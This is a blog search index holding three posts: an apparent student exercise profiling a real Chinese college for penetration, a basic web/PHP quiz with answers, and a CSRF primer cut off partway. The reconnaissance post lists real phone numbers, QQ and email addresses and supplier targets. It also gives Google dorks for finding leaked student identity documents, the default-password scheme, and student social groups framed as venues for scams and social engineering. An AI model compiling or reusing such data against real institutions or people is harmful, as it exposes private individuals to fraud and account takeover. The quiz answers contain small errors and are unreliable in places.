<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>陕西国际商贸学院信息收集</title>
      <link href="/2025/12/06/%E9%99%95%E8%A5%BF%E5%9B%BD%E9%99%85%E5%95%86%E8%B4%B8%E5%AD%A6%E9%99%A2/"/>
      <url>/2025/12/06/%E9%99%95%E8%A5%BF%E5%9B%BD%E9%99%85%E5%95%86%E8%B4%B8%E5%AD%A6%E9%99%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="陕西国际商贸学院信息收集"><a href="#陕西国际商贸学院信息收集" class="headerlink" title="陕西国际商贸学院信息收集"></a>陕西国际商贸学院信息收集</h1><h2 id="1-该学校的统一社会信用代码是多少？法定代表人是谁？"><a href="#1-该学校的统一社会信用代码是多少？法定代表人是谁？" class="headerlink" title="1. 该学校的统一社会信用代码是多少？法定代表人是谁？"></a>1. 该学校的统一社会信用代码是多少？法定代表人是谁？</h2><ul><li><strong>统一社会信用代码：</strong>52610000735361616Q</li><li><strong>法定代表人：</strong>赵超</li></ul><h2 id="2-该学校地理所在位置在哪？"><a href="#2-该学校地理所在位置在哪？" class="headerlink" title="2. 该学校地理所在位置在哪？"></a>2. 该学校地理所在位置在哪？</h2><ul><li>咸阳市秦都区统一西路35号</li></ul><h2 id="3-该学校所使用的邮箱有哪些？"><a href="#3-该学校所使用的邮箱有哪些？" class="headerlink" title="3. 该学校所使用的邮箱有哪些？"></a>3. 该学校所使用的邮箱有哪些？</h2><ul><li><a href="mailto:&#x31;&#x38;&#54;&#53;&#49;&#49;&#x33;&#49;&#57;&#x37;&#x33;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x31;&#x38;&#54;&#53;&#49;&#49;&#x33;&#49;&#57;&#x37;&#x33;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a></li><li><a href="mailto:&#x35;&#x37;&#51;&#x31;&#x38;&#x39;&#55;&#x39;&#51;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#x6d;">&#x35;&#x37;&#51;&#x31;&#x38;&#x39;&#55;&#x39;&#51;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li><a href="mailto:&#x73;&#x6d;&#x78;&#x79;&#x79;&#98;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#x73;&#x6d;&#x78;&#x79;&#x79;&#98;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a></li><li><a href="mailto:&#x73;&#x63;&#98;&#48;&#53;&#48;&#x38;&#64;&#115;&#x6f;&#x68;&#x75;&#x2e;&#99;&#x6f;&#109;">&#x73;&#x63;&#98;&#48;&#53;&#48;&#x38;&#64;&#115;&#x6f;&#x68;&#x75;&#x2e;&#99;&#x6f;&#109;</a></li></ul><h2 id="4-该学校泄露的手机号、QQ-号有哪些（不包含学校官网自己给出的）"><a href="#4-该学校泄露的手机号、QQ-号有哪些（不包含学校官网自己给出的）" class="headerlink" title="4. 该学校泄露的手机号、QQ 号有哪些（不包含学校官网自己给出的）"></a>4. 该学校泄露的手机号、QQ 号有哪些（不包含学校官网自己给出的）</h2><ul><li><strong>手机号：</strong><ol><li>13335410820</li><li>13636730351</li><li>15858200968</li><li>15891101100</li><li>15336111008</li><li>18651131973</li><li>18066843391</li><li>17742423633</li></ol></li><li><strong>QQ号：</strong><ol><li>573189793</li></ol></li></ul><h2 id="5-该学校的供应商有哪些？收集这些信息对我们渗透有什么用？"><a href="#5-该学校的供应商有哪些？收集这些信息对我们渗透有什么用？" class="headerlink" title="5. 该学校的供应商有哪些？收集这些信息对我们渗透有什么用？"></a>5. 该学校的供应商有哪些？收集这些信息对我们渗透有什么用？</h2><ul><li><strong>供应商：</strong><ol><li><a href="https://www.qcc.com/firm/e42a77513f6f6e46fd98631a62257012.html">陕西超星凡宇信息科技有限公司</a></li><li><a href="https://www.qcc.com/firm/14e3f5a6ad1dc2dd61f5bfd5c5b199bf.html">陕西朝云易帆信息科技有限公司</a></li><li>宁夏宁谷医药科技有限公司</li><li><a href="https://www.qcc.com/firm/7eac95abba8c24377fef72a811dae186.html">陕西金鸣建设工程有限公司</a></li><li><a href="https://www.qcc.com/firm/92508ab0d1f90b8b86cc310aaa072874.html">陕西超杰帆科信息科技有限公司</a></li><li><a href="https://www.qcc.com/firm/ff147c82c7256641b90fa6b36ba7ce4a.html">上海商鼎软件科技有限公司</a></li><li><a href="https://www.qcc.com/firm/60566d64c5b3c21db44f881444201d98.html">陕西信诚仪器设备有限公司</a></li><li><a href="https://www.qcc.com/firm/00d1390d0fd5eb9232b3644d2a88f67e.html">西安小满健康管理有限公司</a></li><li><a href="https://www.qcc.com/firm/459c1ad4ab2c85140fbf50f93829a078.html">陕西鑫逸康电子科技有限公司</a></li><li><a href="https://www.qcc.com/firm/02a7fa628dfe5175b05eda61eea77fe6.html">陕西博鹏汇实业有限公司</a></li><li>涛医宝（北京）科技股份有限公司</li><li>衡正国际工程咨询有限公司</li><li><a href="https://www.qcc.com/firm/ed4b4efa76f998762015f45400bf99c2.html">深圳市韦特普科技有限公司</a></li><li><a href="https://www.qcc.com/firm/8941bdb27f3789a4fc539422e0397cd1.html">广东京周联合科技有限公司</a></li><li>陕西科仪实验室系统维护工程有限公司</li><li><a href="https://www.qcc.com/firm/393ae65e100b315135c9be263ee840d2.html">北京维科尔安全技术咨询有限责任公司西安分公司</a></li><li>河北兴航线缆有限公司</li><li><a href="https://www.qcc.com/firm/07e64b5809181bc2822dd12eee114412.html">陕西聚扬机电设备有限公司</a></li><li><a href="https://www.qcc.com/firm/fc01addf0a47e43d4eeff3aad46e8a03.html">陕西正源会计师事务所有限责任公司</a></li><li><a href="https://www.qcc.com/firm/19e402592a333aa71969efc5fba82402.html">河南广文软件科技有限公司</a></li><li><a href="https://www.qcc.com/firm/02d357a82cfa60ee91b076c6975111ed.html">陕西创思智汇科工贸有限公司</a></li><li>西安鼎尚数码信息科技有限公司</li><li><a href="https://www.qcc.com/firm/a934804994bf6445e144d2332cee933a.html">山东贤蕴信息科技有限公司</a></li><li><a href="https://www.qcc.com/firm/ffc0b678ee7dc7827aed72bc615a80bd.html">陕西飞天建筑装饰工程有限责任公司</a></li></ol></li><li><strong>帮助：</strong>企业的安全边界不限于自身的防火墙之内，更是延伸到了所有供应链的伙伴当中，通过收集供应商等合作伙伴的信息，我们更容易发现攻击的入口和立足点，或者窃取相关的敏感信息。</li></ul><h2 id="6-该学校目前所使用的主域名是哪个？并请列出你搜集到的所有子域名信息"><a href="#6-该学校目前所使用的主域名是哪个？并请列出你搜集到的所有子域名信息" class="headerlink" title="6. 该学校目前所使用的主域名是哪个？并请列出你搜集到的所有子域名信息"></a>6. 该学校目前所使用的主域名是哪个？并请列出你搜集到的所有子域名信息</h2><ul><li><strong>主域名：</strong><a href="http://www.csiic.com/">www.csiic.com</a></li><li><strong>子域名：</strong></li></ul><p><img src="G:/blog/myBlog/source/images/InternationalTrade/4.png" alt="4"></p><h2 id="7-该学校校园网默认登录账号和密码是多少？我们能否直接登录？"><a href="#7-该学校校园网默认登录账号和密码是多少？我们能否直接登录？" class="headerlink" title="7. 该学校校园网默认登录账号和密码是多少？我们能否直接登录？"></a>7. 该学校校园网默认登录账号和密码是多少？我们能否直接登录？</h2><ul><li><p>我们直接谷歌语法搜一下<code>site:csiic.com(&quot;默认密码&quot; OR &quot;学号&quot; OR&quot;工号&quot;)</code></p></li><li><p>之后我们发现不能直接登录需要学号和身份证后六位是默认账号密码。</p></li></ul><h2 id="8-该学校统一身份认证平台的默认登录账号和密码是多少？"><a href="#8-该学校统一身份认证平台的默认登录账号和密码是多少？" class="headerlink" title="8. 该学校统一身份认证平台的默认登录账号和密码是多少？"></a>8. 该学校统一身份认证平台的默认登录账号和密码是多少？</h2><ul><li>与第7题一样。</li></ul><h2 id="9-继上题官网给出找回密码的联系方式：029-33695570，这个号码对于我们社工有用吗？请说明原因"><a href="#9-继上题官网给出找回密码的联系方式：029-33695570，这个号码对于我们社工有用吗？请说明原因" class="headerlink" title="9. 继上题官网给出找回密码的联系方式：029-33695570，这个号码对于我们社工有用吗？请说明原因"></a>9. 继上题官网给出找回密码的联系方式：029-33695570，这个号码对于我们社工有用吗？请说明原因</h2><ul><li>没有大用，在社工攻击中，它<strong>可能被攻击者用作伪装身份、增加可信度的辅助工具，而非直接获取密码的钥匙</strong>。</li></ul><h2 id="10-找到该学校泄露的学生信息（有学号或身份证）"><a href="#10-找到该学校泄露的学生信息（有学号或身份证）" class="headerlink" title="10. 找到该学校泄露的学生信息（有学号或身份证）"></a>10. 找到该学校泄露的学生信息（有学号或身份证）</h2><ul><li>通过Google语法<code>site:csiic.com(&quot;身份证号&quot;)</code>和<code>site:csiic.com(&quot;学号&quot;)</code>搜索学生信息可以得到下面两个文档的学生的信息。</li></ul><p><img src="G:/blog/myBlog/source/images/InternationalTrade/1.png" alt="1"></p><h2 id="11-该学校表白墙的账号是多少？对于我们有什么用？"><a href="#11-该学校表白墙的账号是多少？对于我们有什么用？" class="headerlink" title="11. 该学校表白墙的账号是多少？对于我们有什么用？"></a>11. 该学校表白墙的账号是多少？对于我们有什么用？</h2><ul><li><strong>账号：</strong>1458290503</li></ul><p><img src="G:/blog/myBlog/source/images/InternationalTrade/3.jpg" alt="3"></p><ul><li><strong>作用：</strong>攻击者可以利用“表白墙”的公共性、匿名性、权威性和情感氛围，以极低成本对大量学生进行高效的情报收集、精准诈骗和信任渗透。</li></ul><h2 id="12-该学校-2025-届新生群群号是多少？对于我们有什么用？"><a href="#12-该学校-2025-届新生群群号是多少？对于我们有什么用？" class="headerlink" title="12. 该学校 2025 届新生群群号是多少？对于我们有什么用？"></a>12. 该学校 2025 届新生群群号是多少？对于我们有什么用？</h2><ul><li><strong>新生群群号：</strong>807328956</li></ul><p><img src="G:/blog/myBlog/source/images/InternationalTrade/2.jpg" alt="2"></p><ul><li><strong>作用：</strong>收集新生群号能为攻击者提供一个精确的狩猎场，用以获取隐私、伪装身份、投放骗局，最终为实施精准的诈骗和数据窃取铺路。</li></ul><h2 id="13-该学校是否有对外投资？如果有那么请给出被投资企业的基本信息"><a href="#13-该学校是否有对外投资？如果有那么请给出被投资企业的基本信息" class="headerlink" title="13. 该学校是否有对外投资？如果有那么请给出被投资企业的基本信息"></a>13. 该学校是否有对外投资？如果有那么请给出被投资企业的基本信息</h2><ul><li><strong>被投资企业：</strong>陕西超创源科技发展有限公司</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">法定代表人：王同</span><br><span class="line">电话：<span class="number">13571081285</span></span><br><span class="line">统一社会信用代码：<span class="number">91611104</span>MADAKJW8XY</span><br><span class="line">邮箱：<span class="number">287483714</span>@.qq.com</span><br><span class="line">QQ号：<span class="number">287483714</span></span><br><span class="line">地址：陕西省西咸新区沣西新城统一西路<span class="number">35</span>号创业园B区一楼<span class="number">118</span>室</span><br><span class="line">邮政编码：<span class="number">712046</span></span><br></pre></td></tr></table></figure><h2 id="14-该学校使用的公众号账号有哪些？"><a href="#14-该学校使用的公众号账号有哪些？" class="headerlink" title="14. 该学校使用的公众号账号有哪些？"></a>14. 该学校使用的公众号账号有哪些？</h2><ul><li>陕西国际商贸学院公众号</li><li>陕西国际商贸学院招生官徽公众号</li><li>陕西国际商贸学院就业服务中心公众号</li><li>陕商院国际经济学院公众号</li><li>陕西国际商贸学院视频号</li></ul><h2 id="15-继上题找出该学校使用的某产品中存在的安全漏洞并详细给出复现步骤"><a href="#15-继上题找出该学校使用的某产品中存在的安全漏洞并详细给出复现步骤" class="headerlink" title="15. 继上题找出该学校使用的某产品中存在的安全漏洞并详细给出复现步骤"></a>15. 继上题找出该学校使用的某产品中存在的安全漏洞并详细给出复现步骤</h2>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP考核</title>
      <link href="/2025/12/05/PHP%E8%80%83%E6%A0%B8/"/>
      <url>/2025/12/05/PHP%E8%80%83%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP考核"><a href="#PHP考核" class="headerlink" title="PHP考核"></a>PHP考核</h1><ol><li>请写出在 HTML 文档中，用于创建一个<strong>一级标题</strong>和添加一个<strong>普通段落</strong>的两个主要标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>普通段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>HTML 中，用于创建一个<strong>超链接</strong>的标签是什么？并说明用于指定链接目标地址的属性名称</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">&quot;www.xxx.com&quot;</span>&gt;</span>文本链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>HTML 表单中，用于创建一个<strong>文本输入框</strong>的标签和属性组合是什么？</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在 HTML 中，用于插入图片的标签是什么？并说明用于指定图片文件路径的属性名称</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;xxx/xxx/image.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;xxx（用于图片描述）&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>请写出用于创建<strong>无序列表</strong>和<strong>有序列表</strong>的两个不同标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 无序列表 ---&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 无序列表 ---&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>HTML 文档被分为两个主要部分：头部（Head）和主体（Body）。哪一部分包含了用户在浏览器中看到的所有内容？</li></ol><ul><li>用户在浏览器中看到的内容包含在Body部分</li></ul><ol start="7"><li>在一个 HTML <code>&lt;form&gt;</code> 标签中，有两个至关重要的属性用于控制数据如何提交到服务器。请说出这两个属性的名称，并解释它们的作用</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 表单内容 ---&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong><code>action</code>属性：</strong>规定当提交表单时向何处发送表单数据。</li><li><strong><code>method</code>属性：</strong>规定用于发送表单数据的 HTTP 方法。</li></ul><ol start="8"><li><p>在表单提交中，请详细解释使用 <code>method=&quot;GET&quot;</code> 和 <code>method=&quot;POST&quot;</code> 两种方式的主要区别，特别是关于<strong>数据可见性</strong>和<strong>数据量限制</strong>方面</p><table><thead><tr><th align="center"></th><th align="center">GET方法</th><th align="center">POST方法</th></tr></thead><tbody><tr><td align="center">数据可见性</td><td align="center">数据跟随在URL之后，在地址栏可见</td><td align="center">数据包含在请求体之中，不可见</td></tr><tr><td align="center">数据量限制</td><td align="center">受URL长度限制，通常是2048字符</td><td align="center">没有具体限制，可以发送大量字符</td></tr><tr><td align="center">安全性</td><td align="center">因为是暴露在URL中的，所以安全性较低</td><td align="center">不显示在URL中，所以较为安全</td></tr><tr><td align="center">是否进入缓存</td><td align="center">是，可以加入书签</td><td align="center">否，不能加入数书签</td></tr><tr><td align="center">用途</td><td align="center">获取数据，如搜索、筛选</td><td align="center">提交数据，如登录、上传</td></tr></tbody></table></li></ol><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><ol><li>CSS 在 Web 页面中主要负责哪部分内容？</li></ol><ul><li>控制文本颜色、大小、字体种类等。</li><li>设置背景颜色、背景图片等。</li><li>控制不同元素的位置、大小、不同形状等。</li><li>创建动画或者过渡效果。</li><li>实现响应式设计。</li></ul><ol start="2"><li>请写出使用 CSS 将一个段落（<code>&lt;p&gt;</code> 标签）的<strong>文字颜色</strong>设置为<strong>蓝色</strong>的简单 CSS 规则</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.fontsColor</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;fontsColor&quot;</span>&gt;</span>文字颜色<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>了使用英文颜色名称（如 <code>red</code>），CSS 中最常用且精确的颜色表示方法是哪种进制表示法？</li></ol><ul><li>CSS 中最常用且精确的颜色表示方法是<strong>十六进制表示法</strong>。</li></ul><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><ol><li>在 JavaScript 中，用于在浏览器控制台输出一条消息的最常用函数是什么？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;消息内容&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>请写出在现代 JavaScript 中，用于声明一个<strong>可变变量</strong>的关键字</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;值&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;值&quot;</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>在浏览器前端，用于弹出一个带有确定按钮的<strong>警告框</strong>的内置函数是什么？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;这是一个警告信息&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="4"><li>JavaScript 通过哪个内置对象来访问和操作 HTML 文档中的所有元素和内容？</li></ol><ul><li>JavaScript通过<strong>Document对象</strong>（DOM）来访问和操作 HTML 文档中的所有元素和内容。</li></ul><ol start="5"><li>在 JavaScript 中，<code>&quot;5&quot;</code> 和 <code>5</code> 在数据类型上有什么区别？请说出这两种类型分别是什么？</li></ol><ul><li><code>&quot;5&quot;</code>是字符串类型（String）。</li><li><code>5</code>是数字类型（Number）。</li></ul><ol start="6"><li>请解释 JavaScript 中<strong>严格相等</strong>运算符 <code>===</code> 与<strong>相等</strong>运算符 <code>==</code> 的主要区别。哪一个通常在编程中被推荐使用？</li></ol><ul><li><code>==</code>只比较值，会自动进行类型转换。</li><li><code>===</code>比较值和类型，不会进行类型转换。</li><li>推荐使用<code>===</code>因为他更加严格，可以避免因为类型导致的意外结果。</li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li>PHP 代码是在<strong>客户端的浏览器</strong>中运行，还是在<strong>服务器端</strong>运行？</li></ol><ul><li>PHP代码实在服务端运行。</li></ul><ol start="2"><li>PHP 代码块必须以什么特殊的标记开始和结束？请写出这两个标记</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//开始标记</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//结束标记</span></span><br></pre></td></tr></table></figure><ol start="3"><li>请写出 PHP 中用于向浏览器输出字符串（例如 <code>&quot;Hello World!&quot;</code>）的最常用函数或语句</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br></pre></td></tr></table></figure><ol start="4"><li>在 PHP 中，所有变量名必须以哪个特殊符号开头？</li></ol><ul><li>所有变量名必须以<code>$</code>开头。</li></ul><ol start="5"><li>在 PHP 中，用于将两个字符串连接起来的<strong>运算符</strong>是什么？</li></ol><ul><li>将两个字符串连接起来的<strong>运算符</strong>是<code>.</code>。</li></ul><ol start="6"><li>PHP 最常使用哪两个<strong>全局超变量</strong>来分别接收 HTTP <strong>GET</strong> 和 <strong>POST</strong> 请求提交的数据？</li></ol><ul><li>GET请求<code>$_GET</code>。</li><li>POST请求<code>$_POST</code>。</li></ul><ol start="7"><li>PHP 是如何实现<strong>会话（Session）管理</strong>的？请描述当用户首次访问时，PHP 如何在服务器端和客户端之间建立和维持会话状态？</li></ol><ul><li>用户首次访问时，PHP生成唯一的Session ID。</li><li>Session ID通过Cookie发送给客户端。</li><li>服务器存储会话数据文件。</li><li>后续通过请求Session ID识别用户</li></ul><ol start="8"><li>请解释 PHP 中<strong>弱类型</strong>的含义。在进行算术运算时，这种弱类型可能导致什么意外的结果？</li></ol><ul><li><p>PHP会自动进行类型转换</p></li><li><p>意外的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;5abc&quot;</span> + <span class="number">2</span> = <span class="number">7</span>; <span class="comment">// 字符串呗转换为数字5</span></span><br></pre></td></tr></table></figure></li></ul><ol start="9"><li>请说明 PHP 代码中常见的 <code>include</code> 或 <code>require</code> 语句的作用。从安全角度看，当这些语句中的<strong>文件路径可被用户控制</strong>时，可能引发什么严重的安全漏洞？</li></ol><ul><li><strong>作用：</strong>包含并执行外部文件。</li><li><strong>漏洞：</strong>本地文件包含漏洞。</li></ul><ol start="10"><li>从安全角度，当接收用户通过 <code>$_GET</code> 或 <code>$_POST</code> 提交的数据时，为什么总是需要对这些数据进行<strong>过滤和验证</strong>？请举出一个如果不过滤可能引发的安全漏洞名称</li></ol><ul><li><strong>原因：</strong>防止恶意输入导致安全漏洞。</li><li><strong>漏洞名称：</strong>SQL注入。</li></ul><ol start="11"><li>当使用 <code>require</code> 语句包含一个文件时，如果目标文件不存在，程序会继续执行还是终止？（请说明 PHP 的处理方式）</li></ol><ul><li>PHP程序会终止执行。</li></ul><ol start="12"><li>在 PHP 中处理文件上传时，如何<strong>彻底</strong>避免因文件类型检查不严格和文件名可控而导致的<strong>远程代码执行 (RCE)</strong> 漏洞？请至少说出两种关键的防御措施</li></ol><ul><li>白名单验证文件类型。</li><li>重命名上传文件。</li></ul><ol start="13"><li>请描述 PHP <strong>反序列化漏洞</strong>的攻击原理。攻击者通常需要利用 PHP 哪种机制和哪种数据类型才能在反序列化过程中触发<strong>任意代码执行</strong>？</li></ol><ul><li><strong>原理：</strong>使用<code>__wakeup()</code>、<code>__destruct()</code>这一类的魔术方法。</li><li><strong>触发条件：</strong>可控的序列化数据被反序列化。</li></ul><ol start="14"><li>请区分 <strong>本地文件包含 (LFI)</strong> 和 <strong>远程文件包含 (RFI)</strong> 漏洞的本质区别</li></ol><ul><li><strong>本地文件包含：</strong>包含服务器本地文件。</li><li><strong>远程文件包含：</strong>包含远程服务器文件。</li></ul><ol start="15"><li>在 PHP 配置中，哪个关键设置必须关闭才能有效阻止 RFI 攻击？</li></ol><ul><li>关闭<code>allow_url_include</code>设置</li></ul><ol start="16"><li>当比较哈希值时，哪些宽松的比较运算符可能被攻击者利用来绕过检查？</li></ol><ul><li><code>==</code>或<code>!=</code>可能会出现安全问题。</li><li>可以使用<code>hash_equqls()</code></li></ul><ol start="17"><li>请解释 <strong>会话固定</strong> 攻击的原理。为防止该攻击，PHP 应用在用户<strong>成功登录后</strong>应该执行哪个关键的安全操作？</li></ol><ul><li><strong>原理：</strong>攻击者固定Session ID。</li><li><strong>措施：</strong>登陆后重新生成Session ID。</li></ul><ol start="18"><li>请说出在 <code>php.ini</code> 配置文件中，哪个设置的<strong>不安全配置</strong>会直接增加 Web 应用信息泄露攻击的风险？（提示：报错）</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">display_errors</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure><ol start="19"><li>从防御角度看，请解释<strong>最小权限原则</strong>在数据库安全中的重要性</li></ol><ul><li>数据库用户只拥有必要的最小权限，大大限制了攻击影响的范围。</li></ul><ol start="20"><li>请解释 <strong>“永不信任用户输入”</strong> 的安全原则</li></ol><ul><li>所有用户的输入都视为不可信，必须要经过严格的验证和过滤。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础</title>
      <link href="/2025/11/28/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/11/28/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF（跨站请求伪造）基础"><a href="#CSRF（跨站请求伪造）基础" class="headerlink" title="CSRF（跨站请求伪造）基础"></a>CSRF（跨站请求伪造）基础</h1><h2 id="1-什么是CSRF漏洞"><a href="#1-什么是CSRF漏洞" class="headerlink" title="1. 什么是CSRF漏洞"></a>1. 什么是CSRF漏洞</h2><ul><li><strong>CSRF</strong>，全程<strong>Cross-Site Request Forgery</strong>，中文常译为“跨站请求伪造”。它也被称为 <strong>“One-Click Attack”</strong>（一键攻击）或 <strong>“Session Riding”</strong>（会话骑乘）。</li></ul><h3 id="1-1-核心攻击思想"><a href="#1-1-核心攻击思想" class="headerlink" title="1.1 核心攻击思想"></a>1.1 核心攻击思想</h3><ul><li>攻击者欺骗用户的浏览器，使得受害者的浏览器在受害者不知情的情况下，以一个<strong>已经认证的身份（比如受害者已经登陆的状态）</strong>向目标网站发送一个恶意的请求（例如银行网站转账操作）。</li></ul><h2 id="2-CSRF漏洞和的产生原理"><a href="#2-CSRF漏洞和的产生原理" class="headerlink" title="2. CSRF漏洞和的产生原理"></a>2. CSRF漏洞和的产生原理</h2><ul><li>下面这张图展示了CSRF的攻击过程。</li></ul><p><img src="/../images/CSRF/1.png" alt="1"></p><ul><li><p>根据上面的图片，我们可以发现，要成功发起CSRF攻击，必须同时满足以下几个关键条件：</p><ol><li>用户已经登录了目标网站，并且浏览器中保存了该网站的Cookie用于身份验证。</li><li>浏览器在向同一个域名发送请求时，会自动携带该域名下的所有相关Cookie（这是浏览器的同源策略，一般无法被网站禁止）。</li><li>目标网站对于敏感操作的请求（例如：修改密码、转账、发表评论），缺乏足够的安全措施来验证该请求是否确实时由用户资源发出的，仅仅只是通过Cookie来进行身份验证。</li></ol></li><li><p>通过上面的说明，我们可以发现CSRF其实可以理解为：<strong>攻击者到用被害者的身份，以被害者的身份发送恶意请求，但是目标网站又缺乏相关的身份验证，这导致服务器认为这次请求是完全合法的被害者自己的行为。</strong></p></li></ul><h2 id="3-CSRF的分类"><a href="#3-CSRF的分类" 